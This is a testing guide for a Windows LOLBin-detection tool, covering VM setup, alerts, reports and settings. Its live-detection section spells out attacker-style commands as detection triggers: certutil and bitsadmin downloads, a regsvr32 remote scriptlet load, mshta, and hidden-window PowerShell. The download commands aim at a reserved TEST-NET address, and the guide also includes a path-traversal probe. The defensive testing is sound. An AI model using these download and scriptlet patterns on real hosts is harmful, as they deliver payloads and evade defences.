# Testing Guide — LOLBins Defender

A step-by-step plan for verifying every function of the system inside a **disposable virtual machine**. Work through it top to bottom, or jump to a section. Each test lists what to do and what you should see.

> **Why a VM?** Some tests run commands that *look* like attacker behaviour (PowerShell with hidden windows, `certutil` "downloads", `regsvr32` scriptlets). The commands in this guide are deliberately harmless — they sleep, or point at non-routable **TEST-NET** addresses (`192.0.2.0/24`, reserved by RFC 5737, so nothing is ever downloaded). Even so, run them in an isolated VM so a mistake can't touch anything you care about, and so your real antivirus doesn't quarantine test artefacts.

---

## 1. Prepare the virtual machine

1. **Create the VM.** Windows 10 or 11, 2+ vCPUs, 4 GB+ RAM, on VirtualBox, VMware, or Hyper-V. Windows is required for live LOLBin detection; the API and resource monitoring also work on Linux/macOS.
2. **Isolate it.** Set networking to NAT or Host-only. Do not share folders that contain anything sensitive. Keep the VM off any production network.
3. **Copy the project in.** Put the project folder on the VM (shared folder, a ZIP, or `git clone`).
4. **Install the runtimes:**
   - **Python 3.9+** from python.org — tick *"Add python.exe to PATH"* during install.
   - **Node.js 18+ (LTS)** from nodejs.org — needed only for the dashboard.
5. **Take a snapshot** named `clean-baseline` *before* you start. After testing, restore it to return the VM to a pristine state. Take a second snapshot once the app is installed and running (`ready-to-test`) so you can re-run the suite quickly.
6. **Antivirus note.** Microsoft Defender may flag the test commands (that is arguably a good sign). If it interferes, add a Defender exclusion for the project folder *inside the VM only*, or test with tamper-safe commands (Sections 5–6 avoid touching disk).

---

## 2. Install and start the system

From the **project root** in a terminal:

```powershell
pip install -r requirements.txt
python -m backend.utils.enhanced_service_runner
```

You should see log lines ending in:

```
Baseline established: {...}
All service components started - API at http://127.0.0.1:5000/api/v1
```

Leave this window running. In a **second** terminal:

```powershell
cd frontend/lolbas-defender-alert-main
npm install
npm run dev
```

Open **http://localhost:8080**.

**Checklist**
- [ ] `http://127.0.0.1:5000/api/v1/status` returns JSON with `"status": "healthy"`.
- [ ] The dashboard loads and the sidebar footer shows a green **Monitoring** dot with a host name and a "last scan" time.
- [ ] The header/sidebar does **not** show "Backend offline".

> Run the service **as Administrator** for full coverage. Without elevation, Windows hides the command lines of processes owned by other users, so some detections will be missed.

---

## 3. Automated tests (fastest confidence check)

Before manual testing, run the backend test suite from the project root:

```powershell
python -m pytest
```

**Expected:** `32 passed` (plus a few sub-tests), no failures. This exercises the database, every API endpoint, alert filtering/search, bulk status updates, report generation in all three formats, the LOLBin rule matcher, and the config validation.

Optional — verify the dashboard compiles cleanly:

```powershell
cd frontend/lolbas-defender-alert-main
npx tsc --noEmit -p tsconfig.app.json   # types: no output = pass
npm run build                            # production build: ends with "built in ..."
```

---

## 4. Zero-risk pipeline checks (no commands executed)

These prove the detection, alerting, storage and UI pipeline works **without running anything suspicious**. Do these first.

### 4.1 Generate a test alert
- On the dashboard, click **Test alert** (top right) → pick a severity.
- **Expect:** a toast "Test alert created"; within ~5 s a pop-up appears bottom-right; the **Overview** counters and **Latest detections** list update; the sidebar "Alerts" badge increments.
- Open **Alerts**, click the row → the detail drawer shows a dashed "Test alert" note and a MITRE technique.

### 4.2 Rule tester (checks detection logic with zero execution)
- Go to **Detection rules**. The list shows 10 monitored binaries; expand any row to see its command patterns and MITRE mapping.
- In **Rule tester**, click the **certutil download** example, then **Test**.
- **Expect:** a red "Would be flagged", severity **Critical**, the matched patterns (`-urlcache`, `-f`, `http://`) highlighted in the command.
- Click **benign certutil**, then **Test** → green "Would not be flagged".
- Type a nonsense binary like `notepad.exe -urlcache http://x` → "Not a monitored binary".

This is the safe way to confirm every rule works. Fast-exiting binaries (below) are easiest to validate here.

---

## 5. Resource-threshold alerts (safe, deterministic)

You can force CPU/memory/disk alerts without any load by lowering a threshold.

1. Go to **Settings → Resource thresholds**. Set **CPU threshold** to `1`. Click **Save settings**.
2. Wait for the next scan (or click **Scan now** on the Overview/Alerts page).
3. **Expect:** a new `high_cpu` alert appears (severity Medium/High). The detail view shows the observed value and the limit.
4. **Restore** the threshold to `80` and save.

Repeat with **Memory threshold** if you like. This confirms threshold detection, alert storage, notifications and the cooldown (repeated resource alerts are throttled by the *Alert cooldown* setting).

---

## 6. Live LOLBin detection (the real thing)

> The monitor **samples** running processes once per scan interval. A command that finishes in under a second can run *between* scans and be missed — this is expected behaviour, not a bug. Use the resident command below for a guaranteed catch, and lower the scan interval for the fast ones.

**First, speed up scanning:** Settings → **Scan interval** = `5` seconds → Save. (Restore to `60` when done.)

### 6.1 Guaranteed catch — resident PowerShell (safe: it only sleeps)

In the VM terminal:

```powershell
powershell.exe -NoProfile -WindowStyle Hidden -Command "Start-Sleep -Seconds 120"
```

This matches the PowerShell rule (`-noprofile`, `-windowstyle hidden`) and stays alive for 2 minutes, so a scan is certain to sample it. Nothing else happens — it sleeps and exits.

- **Expect within ~5 s:** a **Critical** `lolbin_detection` alert for `powershell.exe`, MITRE **T1059.001**, with the matched flags highlighted. A desktop pop-up and dashboard notification fire.
- **Note:** the alert appears **once**, not every scan — each process is reported a single time.

### 6.2 Fast, non-resident binaries (safe: TEST-NET targets never connect)

Run these with the scan interval at 5 s. Because they exit quickly, run each a few times in a loop so a scan catches one instance. Nothing is downloaded — `192.0.2.10` is a reserved, non-routable address.

```powershell
# certutil "download" (T1105) — connection fails harmlessly
for ($i=0; $i -lt 15; $i++) { certutil.exe -urlcache -split -f http://192.0.2.10/test.txt "$env:TEMP\t.txt" 2>$null; Start-Sleep 2 }

# WMIC process listing (T1047) — completely benign, just prints process names
for ($i=0; $i -lt 15; $i++) { wmic.exe process get name 2>$null; Start-Sleep 2 }

# bitsadmin transfer (T1197) — connection fails harmlessly
for ($i=0; $i -lt 15; $i++) { bitsadmin.exe /transfer t /download http://192.0.2.10/x.txt "$env:TEMP\x.txt" 2>$null; Start-Sleep 2 }
```

- **Expect:** `lolbin_detection` alerts for `certutil.exe`, `wmic.exe`, `bitsadmin.exe` with the right MITRE IDs. If one doesn't appear, it exited between scans — run its loop again, or just confirm it in the **Rule tester** (Section 4.2).
- The remaining binaries (`regsvr32`, `rundll32`, `mshta`, `msiexec`, `sc`, `regasm`) are safest to verify in the **Rule tester** rather than by execution. If you want to run one live, `regsvr32.exe /s /u /i:http://192.0.2.10/a.sct scrobj.dll` matches its rule and fails to connect.

**Clean up:** delete `%TEMP%\t.txt` / `%TEMP%\x.txt` if created, and set **Scan interval** back to `60`.

### Safe command reference

| Binary | Test command (harmless) | Expect | MITRE |
|--------|-------------------------|--------|-------|
| powershell.exe | `powershell.exe -NoProfile -WindowStyle Hidden -Command "Start-Sleep 120"` | Critical | T1059.001 |
| certutil.exe | `certutil.exe -urlcache -f http://192.0.2.10/t.txt %TEMP%\t.txt` | Critical | T1105 |
| wmic.exe | `wmic.exe process get name` | Medium | T1047 |
| bitsadmin.exe | `bitsadmin.exe /transfer t /download http://192.0.2.10/x.txt %TEMP%\x.txt` | Critical | T1197 |
| regsvr32.exe | *(Rule tester)* `regsvr32.exe /s /u /i:http://192.0.2.10/a.sct scrobj.dll` | Critical | T1218.010 |
| mshta.exe | *(Rule tester)* `mshta.exe http://192.0.2.10/x.hta` | Critical | T1218.005 |

---

## 7. Alert triage and the alerts view

On the **Alerts** page:
- [ ] **Search** — type a binary name or MITRE id; the list filters as you type. The URL gains a `?q=` parameter (shareable).
- [ ] **Filters** — the **status** and **severity** segmented controls narrow the list. Links from the dashboard (e.g. clicking a severity in "Severity mix") land here pre-filtered.
- [ ] **Single triage** — open an alert, click **Acknowledge**, then **Resolve** or **False positive**. The status badge and the timeline update; a resolved alert can be **Reopened**.
- [ ] **Bulk triage** — tick several rows; the action bar appears. Click **Resolve** → all selected update at once with one toast.
- [ ] **Detail drawer vs full page** — clicking a row opens a drawer; "Full page" opens `/alert/<id>` directly (test that deep-linking works by refreshing that URL).
- [ ] **Clear all** — the destructive button asks for confirmation, then empties the list. (Reports are kept.)

---

## 8. Reports

On the **Reports** page:
- [ ] Generate an **HTML** report → it downloads and opens in a browser with charts, a top-alerts table and recommendations. Confirm command lines are shown/escaped, not executed.
- [ ] Generate a **CSV** → opens in a spreadsheet, one row per alert, headers `timestamp,id,type,severity,...`.
- [ ] Generate a **JSON** → valid JSON with `summary`, `alerts`, `statistics`.
- [ ] Toggle **Commands**/**MITRE** off and regenerate a CSV → those columns disappear.
- [ ] The **Recent reports** list shows what you generated; **Download** re-fetches a file.
- [ ] Reports are written to `data/reports/` on the backend. The scheduled daily (06:00) and weekly (Mon 07:00) summaries land here too.

---

## 9. Settings persistence

- [ ] Change **Scan interval** and a threshold, click **Save** → toast confirms; the "Unsaved changes" hint clears.
- [ ] Open `config.json` in the project root → your new values are there.
- [ ] Watch the backend log: the next cycle uses the new interval.
- [ ] Try an invalid value (e.g. CPU threshold `150`) → the field shows an inline error and the save is rejected; nothing changes on the backend.
- [ ] Restart the backend → your saved settings persist.
- [ ] Note that email/webhook credentials are intentionally **not** editable here — they live only in `config.json`.

---

## 10. Console UX

- [ ] **Command palette** — press **Ctrl + K** (⌘K on macOS). Jump to a page, run "Scan now", create a test alert, toggle the theme, or find a recent alert.
- [ ] **Theme** — the toggle in the sidebar footer switches dark/light; reload the page and the choice sticks.
- [ ] **Live updates** — with an alert generated, watch counters and the feed refresh on their own (polling every ~5 s) without a manual reload.
- [ ] **Responsive** — narrow the window; the sidebar collapses into a top bar with a menu button.

---

## 11. Resilience and security

- [ ] **Offline handling** — stop the backend (Ctrl+C in its terminal). Within ~10 s the dashboard shows a red **"Backend unreachable"** banner with the restart command. Restart the backend → click **Retry** → it reconnects.
- [ ] **API authentication** — in `config.json` set `"enable_authentication": true` and an `"api_key"`, then restart the backend.
  - `curl http://127.0.0.1:5000/api/v1/alerts` → **401**.
  - `curl -H "X-API-Key: <your key>" http://127.0.0.1:5000/api/v1/alerts` → **200**.
  - For the dashboard, put the key in `frontend/lolbas-defender-alert-main/.env.local` as `VITE_API_KEY=<your key>` and restart `npm run dev`.
  - `/status` and `/system/health` stay open (for liveness checks) — this is intended.
- [ ] **Path traversal** — `curl "http://127.0.0.1:5000/api/v1/reports/download/..%5Cconfig.json"` → **404** (the API refuses anything but a plain report filename).

---

## 12. Windows service install (optional)

To test unattended operation:
1. Run **`install_as_service.bat` as Administrator**. It installs dependencies, downloads NSSM, and registers `SecurityMonitoringService` to auto-start.
2. `sc query SecurityMonitoringService` → `RUNNING`.
3. `http://127.0.0.1:5000/api/v1/status` responds; logs appear in `data\logs\`.
4. Reboot the VM → the service starts on its own.
5. Uninstall: `"%CD%\nssm.exe" remove SecurityMonitoringService confirm`.

---

## 13. Wrap up

- [ ] Optionally clear test data: **Alerts → Clear all**, or delete `data/security_monitoring.db` while the backend is stopped.
- [ ] Note any failures with the backend log (`data/logs/security_monitoring.log`) and the browser console.
- [ ] **Restore the `clean-baseline` snapshot** to wipe the VM.

## Quick expected-results summary

| Area | Pass looks like |
|------|-----------------|
| Automated tests | `pytest` → 32 passed |
| Status | `/api/v1/status` healthy, monitoring running |
| Test alert | Alert stored, pop-up shown, counters update |
| Rule tester | certutil download → Critical; benign → not flagged |
| Threshold alert | Lower CPU threshold → `high_cpu` alert next scan |
| Live LOLBin | Hidden PowerShell → one Critical `lolbin_detection` (T1059.001) |
| Triage | Single + bulk status changes persist |
| Reports | HTML/CSV/JSON download and open correctly |
| Settings | Saved to `config.json`, survive restart, bad values rejected |
| Offline | Banner appears when backend down, reconnects on retry |
| Auth | 401 without key, 200 with key when enabled |
